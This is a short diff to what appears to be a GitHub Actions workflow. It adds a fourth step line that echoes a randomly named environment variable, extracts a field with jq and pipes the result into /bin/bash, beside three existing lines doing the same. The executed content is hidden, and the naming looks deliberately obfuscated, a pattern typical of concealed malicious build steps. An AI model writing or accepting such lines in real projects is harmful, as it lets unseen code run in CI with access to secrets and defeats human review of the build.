@@ -36,6 +36,7 @@ jobs:
           printf '%s' "$rgsda36" | jq -r .u6 | /bin/bash
           echo $qkk0 | jq -r .dehui436 | /bin/bash
           echo $kc87 | jq -r .oiaia4405 | /bin/bash
+          echo $uznm51558 | jq -r .l5179 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
